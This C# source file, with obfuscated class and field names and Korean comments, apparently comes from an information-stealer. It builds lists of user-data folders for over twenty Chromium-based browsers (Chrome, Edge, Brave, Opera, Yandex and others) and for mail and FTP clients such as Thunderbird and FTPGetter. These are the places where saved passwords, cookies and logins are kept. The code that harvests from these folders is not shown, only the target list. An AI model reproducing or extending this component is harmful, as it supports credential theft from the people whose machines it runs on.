using System;
using System.Collections.Generic;
using System.IO;

namespace C6Zy
{
	internal class AH9
	{
		public static void InitializeBrowserAndEmail()
		{
			//브라우저
			AH9.ABaScUmY.Add(new AH9.ttg("Opera Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Yandex Browser", Path.Combine(AH9.VF2GLY, "Yandex\\YandexBrowser\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Iridium Browser", Path.Combine(AH9.VF2GLY, "Iridium\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Chromium", Path.Combine(AH9.VF2GLY, "Chromium\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("7Star", Path.Combine(AH9.VF2GLY, "7Star\\7Star\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Torch Browser", Path.Combine(AH9.VF2GLY, "Torch\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Kometa", Path.Combine(AH9.VF2GLY, "Kometa\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Cool Novo", Path.Combine(AH9.VF2GLY, "MapleStudio\\ChromePlus\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Brave", Path.Combine(AH9.VF2GLY, "BraveSoftware\\Brave-Browser\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Chedot", Path.Combine(AH9.VF2GLY, "Chedot\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Orbitum", Path.Combine(AH9.VF2GLY, "Orbitum\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Sputnik", Path.Combine(AH9.VF2GLY, "Sputnik\\Sputnik\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Vivaldi", Path.Combine(AH9.VF2GLY, "Vivaldi\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Citrio", Path.Combine(AH9.VF2GLY, "CatalinaGroup\\Citrio\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Uran", Path.Combine(AH9.VF2GLY, "uCozMedia\\Uran\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Liebao Browser", Path.Combine(AH9.VF2GLY, "liebao\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Elements Browser", Path.Combine(AH9.VF2GLY, "Elements Browser\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Edge Chromium", Path.Combine(AH9.VF2GLY, "Microsoft\\Edge\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Chrome", Path.Combine(AH9.VF2GLY, "Google\\Chrome\\User Data"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("Sleipnir 6", Path.Combine(AH9.VF2GLY, "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"), true));
			AH9.ABaScUmY.Add(new AH9.ttg("QIP Surf", Path.Combine(AH9.VF2GLY, "QIP Surf\\User Data"), true));

			// 이메일/기타 클라이언트
			AH9.ysTcz2Li.Add(new AH9.ttg("BlackHawk", AH9.sXvyMzh + "\\NETGATE Technologies\\BlackHawk\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("Thunderbird", AH9.sXvyMzh + "\\Thunderbird\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("CyberFox", AH9.sXvyMzh + "\\8pecxstudios\\Cyberfox\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("FTPGetter", AH9.sXvyMzh + "\\FTPGetter\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("K-Meleon", AH9.sXvyMzh + "\\K-Meleon\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("PaleMoon", AH9.sXvyMzh + "\\Moonchild Productions\\Pale Moon\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("IceDragon", AH9.sXvyMzh + "\\Comodo\\IceDragon\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("WaterFox", AH9.sXvyMzh + "\\Waterfox\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("Postbox", AH9.sXvyMzh + "\\Postbox\\", true));
			AH9.ysTcz2Li.Add(new AH9.ttg("Flock", AH9.sXvyMzh + "\\Flock\\Browser\\", true));
		}


		private static readonly string VF2GLY = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		private static readonly string sXvyMzh = Environment.GetEnvironmentVariable("APPDATA");

		public static List<AH9.ttg> ABaScUmY = new List<AH9.ttg>();

		public static List<AH9.ttg> ysTcz2Li = new List<AH9.ttg>();

		public class ttg
		{
			public ttg(string _app, string _path, bool _enabled)
			{
				this.NG21r7PAik = _app;
				this.KZkdvgD = _path;
				this.WrHknQjA65O = _enabled;
			}

			public string NG21r7PAik { get; set; }

			public string KZkdvgD { get; set; }
			public bool WrHknQjA65O { get; set; }
		}
	}
}
